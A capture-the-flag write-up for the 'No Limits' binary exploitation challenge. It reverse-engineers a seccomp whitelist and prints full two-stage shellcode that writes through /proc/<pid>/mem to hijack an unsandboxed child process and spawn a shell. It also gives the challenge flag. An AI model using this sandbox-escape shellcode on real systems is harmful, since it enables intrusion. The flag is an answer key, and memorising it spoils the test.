**Category**: Binary Exploitation  
**Author**: Wittner

![](./files/02%20-%20No%20Limits/02%20-%20No%20Limits.png)

---

The `no_limits` file was an x64 ELF executable hosted on the challenge instance. It displayed this menu when connected to:

```
$ nc 10.1.3.170 9999
Enter the command you want to do:
1) Create Memory
2) Get Debug Informationn
3) Execute Code
4) Exit
1
How big do you want your memory to be?
100
What permissions would you like for the memory?
7
What do you want to include?
test
Wrote your buffer at 0x7bdca9c5c000
Enter the command you want to do:
5) Create Memory
6) Get Debug Informationn
7) Execute Code
8) Exit
2
Debug information:
Child PID = 12
Enter the command you want to do:
9) Create Memory
10) Get Debug Informationn
11) Execute Code
12) Exit
3
Where do you want to execute code?
100
```

This resulted in a disconnect as the program attempted to call an invalid adress.

To begin the reverse engineering process, the first thing I did was run `checksec`:

![](./files/02%20-%20No%20Limits/01.png)

Stack canaries and NX, but no [PIE](https://en.wikipedia.org/wiki/Position-independent_code). Partial [RELRO](https://ctf101.org/binary-exploitation/relocation-read-only/) meant it would be possible to overwrite [GOT](https://en.wikipedia.org/wiki/Global_Offset_Table) entries.

Looking at the `main` function, it was clear that the program immediately forked:

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v4; // [rsp+0h] [rbp-70h] BYREF
  int v5; // [rsp+4h] [rbp-6Ch] BYREF
  unsigned int v6; // [rsp+8h] [rbp-68h]
  int v7; // [rsp+Ch] [rbp-64h]
  int n[2]; // [rsp+10h] [rbp-60h] BYREF
  void (*v9)(void); // [rsp+18h] [rbp-58h] BYREF
  void *ptr; // [rsp+20h] [rbp-50h]
  void *v11; // [rsp+28h] [rbp-48h]
  void (*v12)(void); // [rsp+30h] [rbp-40h]
  char *Memory; // [rsp+38h] [rbp-38h]
  char s[11]; // [rsp+44h] [rbp-2Ch] BYREF
  char v15[11]; // [rsp+4Fh] [rbp-21h] BYREF
  char s1[14]; // [rsp+5Ah] [rbp-16h] BYREF
  unsigned __int64 v17; // [rsp+68h] [rbp-8h]

  v17 = __readfsqword(0x28u);
  ptr = 0LL;
  v4 = 0;
  v11 = 0LL;
  v5 = 0;
  v7 = 0;
  *n = 0LL;
  v9 = 0LL;
  v12 = 0LL;
  Setup(argc, argv, envp);
  v6 = fork();
  if ( v6 )
  {
    while ( 1 )
    {
      puts("Enter the command you want to do:");
      menu();
      memset(s, 0, sizeof(s));
      v5 = 0;
      fgets(s, 11, stdin);
      __isoc99_sscanf(s, "%d", &v5);
      if ( v5 == 4 )
        break;
      if ( v5 <= 4 )
      {
        switch ( v5 )
        {
          case 3:
            puts("Where do you want to execute code?");
            __isoc99_scanf("%lx", &v9);
            ProtectProgram();
            v12 = v9;
            v9();
            goto LABEL_16;
          case 1:
            puts("How big do you want your memory to be?");
            fgets(v15, 11, stdin);
            __isoc99_sscanf(v15, "%lu", n);
            puts("What permissions would you like for the memory?");
            fgets(s1, 11, stdin);
            __isoc99_sscanf(s1, "%d", &v4);
            fflush(stdin);
            Memory = CreateMemory(*n, v4);
            puts("What do you want to include?");
            fgets(Memory, n[0], stdin);
            printf("Wrote your buffer at %p\n", Memory);
            free(ptr);
            ptr = 0LL;
            break;
          case 2:
            puts("Debug information:");
            printf("Child PID = %d\n", v6);
            break;
        }
      }
    }
  }
  else
  {
    ptr = malloc(0x100uLL);
    while ( 1 )
    {
      strcpy(s1, "Hello world!\n");
      if ( !strncmp(s1, "Give me the flag!", 0x11uLL) )
        printf("I will not give you the flag!");
      v7 = strncmp(s1, "exit", 4uLL);
      if ( !v7 )
        break;
      sleep(5u);
    }
  }
LABEL_16:
  if ( ptr )
    free(ptr);
  free(v11);
  return 0;
}
```

The child process would then allocate some memory and enter an infinite loop. Obtaining the PID of that child was possible through the menu. The other two menu options did exactly as they suggested; option `1` allocated memory and wrote our data to it, while option `3` would attempt to call a user supplied address.

The `CreateMemory` function did nothing special at all:

```C
void *__fastcall CreateMemory(__int64 a1, int a2)
{
  void *v3; // [rsp+18h] [rbp-8h]

  v3 = mmap(0LL, (a1 + 4095) & 0xFFFFFFFFFFFFF000LL, a2 | 1u, 34, -1, 0LL);
  if ( v3 == -1LL )
    perror("mmap");
  return v3;
}
```

Things got interesting when looking at option `3` however. Just before the address was called, the program would call `ProtectProgram`:

```C
__int64 ProtectProgram()
{
  int v1; // [rsp+4h] [rbp-Ch]
  int v2; // [rsp+4h] [rbp-Ch]
  int v3; // [rsp+4h] [rbp-Ch]
  int v4; // [rsp+4h] [rbp-Ch]
  int v5; // [rsp+4h] [rbp-Ch]
  int v6; // [rsp+4h] [rbp-Ch]
  int v7; // [rsp+4h] [rbp-Ch]
  int v8; // [rsp+4h] [rbp-Ch]
  int v9; // [rsp+4h] [rbp-Ch]
  int v10; // [rsp+4h] [rbp-Ch]
  int v11; // [rsp+4h] [rbp-Ch]
  int v12; // [rsp+4h] [rbp-Ch]
  int v13; // [rsp+4h] [rbp-Ch]
  int v14; // [rsp+4h] [rbp-Ch]
  int v15; // [rsp+4h] [rbp-Ch]
  int v16; // [rsp+4h] [rbp-Ch]
  int v17; // [rsp+4h] [rbp-Ch]
  int v18; // [rsp+4h] [rbp-Ch]
  int v19; // [rsp+4h] [rbp-Ch]
  int v20; // [rsp+4h] [rbp-Ch]
  int v21; // [rsp+4h] [rbp-Ch]
  __int64 v22; // [rsp+8h] [rbp-8h]

  v22 = seccomp_init(0LL);
  v1 = seccomp_rule_add(v22, 2147418112LL, 4LL, 0LL);
  v2 = seccomp_rule_add(v22, 2147418112LL, 5LL, 0LL) | v1;
  v3 = seccomp_rule_add(v22, 2147418112LL, 6LL, 0LL) | v2;
  v4 = seccomp_rule_add(v22, 2147418112LL, 8LL, 0LL) | v3;
  v5 = seccomp_rule_add(v22, 2147418112LL, 10LL, 0LL) | v4;
  v6 = seccomp_rule_add(v22, 2147418112LL, 12LL, 0LL) | v5;
  v7 = seccomp_rule_add(v22, 2147418112LL, 21LL, 0LL) | v6;
  v8 = seccomp_rule_add(v22, 2147418112LL, 24LL, 0LL) | v7;
  v9 = seccomp_rule_add(v22, 2147418112LL, 32LL, 0LL) | v8;
  v10 = seccomp_rule_add(v22, 2147418112LL, 33LL, 0LL) | v9;
  v11 = seccomp_rule_add(v22, 2147418112LL, 56LL, 0LL) | v10;
  v12 = seccomp_rule_add(v22, 2147418112LL, 57LL, 0LL) | v11;
  v13 = seccomp_rule_add(v22, 2147418112LL, 58LL, 0LL) | v12;
  v14 = seccomp_rule_add(v22, 2147418112LL, 60LL, 0LL) | v13;
  v15 = seccomp_rule_add(v22, 2147418112LL, 62LL, 0LL) | v14;
  v16 = seccomp_rule_add(v22, 2147418112LL, 1LL, 0LL) | v15;
  v17 = seccomp_rule_add(v22, 2147418112LL, 2LL, 0LL) | v16;
  v18 = seccomp_rule_add(v22, 2147418112LL, 96LL, 0LL) | v17;
  v19 = seccomp_rule_add(v22, 2147418112LL, 102LL, 0LL) | v18;
  v20 = seccomp_rule_add(v22, 2147418112LL, 104LL, 0LL) | v19;
  v21 = seccomp_rule_add(v22, 2147418112LL, 231LL, 0LL) | v20;
  if ( seccomp_load(v22) | v21 )
  {
    perror("seccomp");
    exit(1);
  }
  return seccomp_release(v22);
}
```

This set up a number of [seccomp](https://en.wikipedia.org/wiki/Seccomp) filter rules. The second value was `SECCOMP_RET_ALLOW` as defined in `seccomp.h`.

```
$ cat /usr/include/linux/seccomp.h | grep SECCOMP_RET_ALLOW
#define SECCOMP_RET_ALLOW	 0x7fff0000U /* allow */
```

This resulted in the creation of a whitelist of explicitly allowed [Linux syscalls](https://filippo.io/linux-syscall-table/), specifically these:

| Syscall Number | Function Name                                                                            |
| -------------- | ---------------------------------------------------------------------------------------- |
| 4              | [stat](https://manpages.debian.org/unstable/manpages-dev/stat.2.en.html)                 |
| 5              | [fstat](https://manpages.debian.org/unstable/manpages-dev/fstat.2.en.html)               |
| 6              | [lstat](https://manpages.debian.org/unstable/manpages-dev/lstat.2.en.html)               |
| 8              | [lseek](https://manpages.debian.org/unstable/manpages-dev/lseek.2.en.html)               |
| 10             | [mprotect](https://manpages.debian.org/unstable/manpages-dev/mprotect.2.en.html)         |
| 12             | [brk](https://manpages.debian.org/unstable/manpages-dev/brk.2.en.html)                   |
| 21             | [access](https://manpages.debian.org/unstable/manpages-dev/access.2.en.html)             |
| 24             | [sched_yield](https://manpages.debian.org/unstable/manpages-dev/sched_yield.2.en.html)   |
| 32             | [dup](https://manpages.debian.org/unstable/manpages-dev/dup.2.en.html)                   |
| 33             | [dup2](https://manpages.debian.org/unstable/manpages-dev/dup2.2.en.html)                 |
| 56             | [clone](https://manpages.debian.org/unstable/manpages-dev/clone.2.en.html)               |
| 57             | [fork](https://manpages.debian.org/unstable/manpages-dev/fork.2.en.html)                 |
| 58             | [vfork](https://manpages.debian.org/unstable/manpages-dev/vfork.2.en.html)               |
| 60             | [exit](https://manpages.debian.org/unstable/manpages-dev/exit.2.en.html)                 |
| 62             | [kill](https://manpages.debian.org/unstable/manpages-dev/kill.2.en.html)                 |
| 1              | [write](https://manpages.debian.org/unstable/manpages-dev/write.2.en.html)               |
| 2              | [open](https://manpages.debian.org/unstable/manpages-dev/open.2.en.html)                 |
| 96             | [gettimeofday](https://manpages.debian.org/unstable/manpages-dev/gettimeofday.2.en.html) |
| 102            | [getuid](https://manpages.debian.org/unstable/manpages-dev/getuid.2.en.html)             |
| 104            | [getgid](https://manpages.debian.org/unstable/manpages-dev/getgid.2.en.html)             |
| 231            | [exit_group](https://manpages.debian.org/unstable/manpages-dev/exit_group.2.en.html)     |

This was fairly restrictive, but there were a couple of tricks available. First, befause the child process was spawned *before* the seccomp rules were put in place, the child process was not beholden to them. So while the parent process couldn't, for example, just open and read the flag (because [read](https://manpages.debian.org/unstable/manpages-dev/read.2.en.html) was implicitly blacklisted), the child process absolutely *could*! Not being able to call `read` *also* meant it wasn't possible to access any information about the child process other than the PID provided via the menu. This is where PIE being disabled came into play. If [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) was enabled then addresses such as the stack, the heap and the location of libc would be randomized, but because PIE was *disabled*, the base address of the main executable **remained the same across executions**. As seen in the above screenshot, the `no_limits` binary's base address was `0x400000` and that would never change.

What this meant is that I effectively already knew where in everything in the child process (besides the stack, heap, libc, etc) would be, including the GOT!

The exploitation process that I chose went as follows:

- Allocate RWX memory in the parent and write stage one shellcode to it, then execute it.
- Stage one then calls `open` on `/proc/CHILDPID/mem`, giving me write access to its `.text` segment (normally RX).
- Stage one shellcode then writes stage two shellcode into the child process' `.text` segment using `write`.
- Stage one shellcode finally overwrites the GOT entry for `sleep` in the child process with the address of the stage two shellcode.
- When the child's infinite loop iterates and calls `sleep` again, the stage two payload is detonated.
- Stage two shellcode executes in the child process and reads the flag, pops a shell, etc.

Because the child was in an infinite loop, I could safely just overwrite the beginning of `.text` and not have to worry about much. Originally I was just reading the flag off disk and then writing the contents back to the socket's file descriptor, but that was lame and I wanted a proper shell. Behold!

```C
.intel_syntax noprefix
.globl _start

/* ========== stage1 (executes in parent) ========== */
_start:	
	/* align stack */
	add rsp, 8

	/* open("/proc/<pid>/mem", O_WRONLY) */
	lea rdi, proc_mem[rip]
	mov rsi, 1
	xor rdx, rdx
	mov rax, 2
	syscall

	/* save file descriptor */
	mov rdi, rax

	/* lseek() to .text address */
	mov rax, 8
	mov rsi, 0x4012B0
	xor rdx, rdx
	syscall

	/* calculate stage2 address and size */
	lea rsi, stage2_head[rip]
	lea rdx, stage2_tail[rip]
	sub rdx, rsi

	/* write() stage2 bytes to .text */
	mov rax, 1
	syscall

	/* lseek() to sleep() .got.plt entry */
	mov rax, 8
	mov rsi, 0x4040A8
	xor rdx, rdx
	syscall
	
	/* write() .text address to sleep() .got.plt entry */
	mov rax, 1
	lea rsi, text_addr[rip]
	mov rdx, 8
	syscall

loop:
	/* infinite loop to keep parent alive */
	jmp loop

/* ========== stage2 (executes in child) ========== */
stage2_head:
	/* dup2(1, 0) redirect socket->stdin file descriptor */
	mov rax, 33
	mov rdi, 1
	xor rsi, rsi
	syscall
	
	/* execve("/bin/sh", ["/bin/sh", null], null) */
	xor rdi, rdi
	push rdi
	mov rdi, 0x68732F6E69622F2F
	push rdi
	mov rdi, rsp
	xor rsi, rsi
	push rsi
	push rdi
	mov rsi, rsp
	xor rdx, rdx
	mov rax, 59
	syscall

	/* exit() */
	mov rax, 60
	xor rdi, rdi
	syscall    

proc_mem:
	.asciz "/proc/%i/mem"
	
text_addr:
	.quad 0x4012B0

stage2_tail:
```

This was assembled at runtime using [pwntools](https://docs.pwntools.com/en/stable/) and feeding the child PID into it to satisfy the Python `%i` string interpolation placeholder.

![](./files/02%20-%20No%20Limits/02.png)

Flag: **flag{6f6c733424f20f22303fd47aeb991425}**

---

**Files:**
- [no_limits](./files//02%20-%20No%20Limits/no_limits)
- [solve.py](./files//02%20-%20No%20Limits/solve.py)